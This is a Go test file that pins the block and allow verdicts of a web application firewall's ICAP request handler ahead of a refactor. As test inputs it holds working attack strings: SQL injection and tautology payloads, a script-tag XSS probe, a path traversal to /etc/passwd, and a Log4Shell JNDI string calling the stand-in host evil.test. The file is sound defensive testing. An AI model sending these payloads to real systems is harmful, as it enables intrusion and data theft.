package main

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/textproto"
	"sort"
	"strings"
	"testing"

	"github.com/go-icap/icap"
)

// SECURE-QUAL-02. handleReqmod was 226 NLOC at cyclomatic complexity 48 — the
// single hottest path in the product, inspecting every request that crosses the
// proxy, in one function with no seam a test could reach.
//
// This pins its OBSERVABLE BEHAVIOUR before that function is split, so the
// refactor can be shown to preserve it rather than argued to. It captures the
// verdict, not the shape: the ICAP status, the HTTP status attached to a block,
// and the decision fields of the TrafficFeature the handler emits (action,
// score, matched rule IDs). Time-varying fields — event ID, latency, timestamp
// — are deliberately excluded.
//
// It is written to keep passing after the split. If it ever has to be edited to
// accommodate a refactor, that refactor changed behaviour.

// verdict is the fingerprint of one inspection.
type verdict struct {
	ICAPCode     int
	HTTPStatus   int // 0 when no HTTP response is attached
	Action       string
	Score        int
	Rules        string // sorted, comma-joined
	FeatureFound bool
}

func (v verdict) String() string {
	return fmt.Sprintf("icap=%d http=%d action=%s score=%d rules=[%s] feature=%v",
		v.ICAPCode, v.HTTPStatus, v.Action, v.Score, v.Rules, v.FeatureFound)
}

// runReqmod drives one request through handleReqmod and captures its verdict.
// It installs a TrafficLogger whose channel is drained here rather than by a
// writer goroutine, so the feature the handler emitted can be read back without
// touching the filesystem.
func runReqmod(t *testing.T, r *http.Request, clientIP string) verdict {
	t.Helper()

	prevLog := trafficLog
	trafficLog = &TrafficLogger{ch: make(chan TrafficFeature, 8)}
	defer func() { trafficLog = prevLog }()

	ireq := &icap.Request{Request: r, Header: textproto.MIMEHeader{}}
	if clientIP != "" {
		ireq.Header.Set("X-Client-Ip", clientIP)
	}
	w := &mockResponseWriter{}
	handleReqmod(w, ireq)

	v := verdict{ICAPCode: w.code}
	if resp, ok := w.resp.(*http.Response); ok && resp != nil {
		v.HTTPStatus = resp.StatusCode
	}
	select {
	case f := <-trafficLog.ch:
		v.FeatureFound = true
		v.Action = f.Action
		v.Score = f.WAFScore
		rules := append([]string(nil), f.WAFRules...)
		sort.Strings(rules)
		v.Rules = strings.Join(rules, ",")
	default:
	}
	return v
}

func TestHandleReqmodVerdicts(t *testing.T) {
	// blockThreshold is a package-level global that other tests in this package
	// overwrite, so pin it here and restore it.
	prev := blockThreshold
	blockThreshold = 10
	t.Cleanup(func() { blockThreshold = prev })

	cases := []struct {
		name     string
		request  func() *http.Request
		clientIP string
		want     verdict
	}{
		{
			name:     "benign GET is allowed and logged",
			request:  func() *http.Request { return httptest.NewRequest("GET", "http://example.com/index.html", nil) },
			clientIP: "198.51.100.10",
			want:     verdict{ICAPCode: 204, Action: "allow", Score: 0, Rules: "", FeatureFound: true},
		},
		{
			name: "SQL injection in the query string blocks",
			request: func() *http.Request {
				return httptest.NewRequest("GET", "http://example.com/login?u=%27+OR+1%3D1--", nil)
			},
			clientIP: "198.51.100.11",
			// Score and rules changed deliberately when SQLi-017 was added for
			// quoted tautologies (SECURE-INPT-01): this payload now matches it
			// too, so the normalized scan alone crosses the threshold and the
			// raw-URL rescan — which contributed SQLi-015 — is skipped. The
			// DECISION is unchanged; the golden is updated because detection
			// improved, not because a refactor moved something.
			want: verdict{ICAPCode: 200, HTTPStatus: 403, Action: "block", Score: 17, Rules: "SQLi-006,SQLi-017", FeatureFound: true},
		},
		{
			name: "XSS in the query string blocks",
			request: func() *http.Request {
				return httptest.NewRequest("GET", "http://example.com/s?q=<script>alert(1)</script>", nil)
			},
			clientIP: "198.51.100.12",
			want:     verdict{ICAPCode: 200, HTTPStatus: 403, Action: "block", Score: 10, Rules: "XSS-001", FeatureFound: true},
		},
		{
			name: "quoted SQL tautology blocks",
			request: func() *http.Request {
				return httptest.NewRequest("GET", "http://example.com/login?user=admin%27+OR+%271%27%3D%271&pass=x", nil)
			},
			clientIP: "198.51.100.20",
			want:     verdict{ICAPCode: 200, HTTPStatus: 403, Action: "block", Score: 10, Rules: "SQLi-017", FeatureFound: true},
		},
		{
			name: "comment-terminator blocks",
			request: func() *http.Request {
				return httptest.NewRequest("GET", "http://example.com/login?user=admin%27--&pass=x", nil)
			},
			clientIP: "198.51.100.21",
			want:     verdict{ICAPCode: 200, HTTPStatus: 403, Action: "block", Score: 10, Rules: "SQLi-015,SQLi-018", FeatureFound: true},
		},
		{
			name: "quoted equality in prose is allowed",
			request: func() *http.Request {
				return httptest.NewRequest("GET", "http://example.com/faq?q=is+%27true%27+%3D+%27true%27+in+python", nil)
			},
			clientIP: "198.51.100.22",
			want:     verdict{ICAPCode: 204, Action: "allow", Score: 4, Rules: "SQLi-015", FeatureFound: true},
		},
		{
			name:     "path traversal blocks",
			request:  func() *http.Request { return httptest.NewRequest("GET", "http://example.com/../../etc/passwd", nil) },
			clientIP: "198.51.100.13",
			want:     verdict{ICAPCode: 200, HTTPStatus: 403, Action: "block", Score: 10, Rules: "DirT-001", FeatureFound: true},
		},
		{
			name: "Log4Shell in a header blocks",
			request: func() *http.Request {
				r := httptest.NewRequest("GET", "http://example.com/", nil)
				r.Header.Set("User-Agent", "${jndi:ldap://evil.test/a}")
				return r
			},
			clientIP: "198.51.100.14",
			want:     verdict{ICAPCode: 200, HTTPStatus: 403, Action: "block", Score: 10, Rules: "L4S-001", FeatureFound: true},
		},
		{
			name: "SQL injection in a form body blocks",
			request: func() *http.Request {
				r := httptest.NewRequest("POST", "http://example.com/login",
					strings.NewReader("user=x&q=UNION SELECT password FROM users"))
				r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				return r
			},
			clientIP: "198.51.100.15",
			want:     verdict{ICAPCode: 200, HTTPStatus: 403, Action: "block", Score: 10, Rules: "SQLi-001", FeatureFound: true},
		},
		{
			name: "a body the WAF does not inspect is passed through",
			request: func() *http.Request {
				r := httptest.NewRequest("POST", "http://example.com/upload", strings.NewReader("\x89PNG\r\n\x1a\n"))
				r.Header.Set("Content-Type", "image/png")
				return r
			},
			clientIP: "198.51.100.16",
			want:     verdict{ICAPCode: 204, Action: "allow", Score: 0, Rules: "", FeatureFound: true},
		},
		{
			name:     "a LAN destination skips inspection entirely",
			request:  func() *http.Request { return httptest.NewRequest("GET", "http://192.168.1.10/admin?q='+OR+1=1--", nil) },
			clientIP: "198.51.100.17",
			want:     verdict{ICAPCode: 204, FeatureFound: false},
		},
		{
			name:     "a request with no client IP header still gets a verdict",
			request:  func() *http.Request { return httptest.NewRequest("GET", "http://example.com/plain", nil) },
			clientIP: "",
			want:     verdict{ICAPCode: 204, Action: "allow", Score: 0, Rules: "", FeatureFound: true},
		},
		{
			name:     "an unparseable client IP does not crash the inspection",
			request:  func() *http.Request { return httptest.NewRequest("GET", "http://example.com/plain2", nil) },
			clientIP: "not-an-ip",
			want:     verdict{ICAPCode: 204, Action: "allow", Score: 0, Rules: "", FeatureFound: true},
		},
	}

	got := make(map[string]verdict, len(cases))
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got[tc.name] = runReqmod(t, tc.request(), tc.clientIP)
		})
	}

	for _, tc := range cases {
		if v := got[tc.name]; v != tc.want {
			t.Errorf("%s\n  got  %s\n  want %s", tc.name, v, tc.want)
		}
	}
}

// The safe-URL cache must short-circuit a repeated clean GET, and must never
// let a clean GET vouch for a POST to the same URL — the cache key is scoped by
// method precisely because that was once possible.
func TestHandleReqmodSafeCacheScoping(t *testing.T) {
	prev := blockThreshold
	blockThreshold = 10
	t.Cleanup(func() { blockThreshold = prev })

	const u = "http://example.com/cache-scope-probe"
	first := runReqmod(t, httptest.NewRequest("GET", u, nil), "198.51.100.30")
	if !first.FeatureFound {
		t.Fatal("the first GET should have been inspected and logged")
	}
	second := runReqmod(t, httptest.NewRequest("GET", u, nil), "198.51.100.30")
	if second.FeatureFound {
		t.Error("the second identical GET was inspected again — the safe cache did not short-circuit it")
	}
	if second.ICAPCode != 204 {
		t.Errorf("a cached-safe GET returned %d, want 204", second.ICAPCode)
	}

	post := httptest.NewRequest("POST", u, strings.NewReader("q=1"))
	post.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if v := runReqmod(t, post, "198.51.100.30"); !v.FeatureFound {
		t.Error("a POST was served from the cache a GET populated — the key is not scoped by method")
	}
}

// The block decision is "score >= threshold", and the boundary is the whole
// contract: at exactly the threshold a request must block. Driven by moving the
// threshold around a rule of known score rather than by constructing a payload
// that happens to land on it.
func TestHandleReqmodBlocksAtExactlyTheThreshold(t *testing.T) {
	prev := blockThreshold
	t.Cleanup(func() { blockThreshold = prev })

	const xssScore = 10 // XSS-001, pinned by TestHandleReqmodVerdicts above

	newReq := func(n int) *http.Request {
		// A distinct path per call so the safe-URL cache cannot answer for us.
		return httptest.NewRequest("GET", fmt.Sprintf("http://example.com/thr%d?q=<script>alert(1)</script>", n), nil)
	}

	blockThreshold = xssScore
	if v := runReqmod(t, newReq(1), "198.51.100.40"); v.Action != "block" {
		t.Errorf("score %d at threshold %d was not blocked: %s", xssScore, blockThreshold, v)
	}

	blockThreshold = xssScore + 1
	if v := runReqmod(t, newReq(2), "198.51.100.41"); v.Action != "allow" {
		t.Errorf("score %d below threshold %d was blocked: %s", xssScore, blockThreshold, v)
	}
}
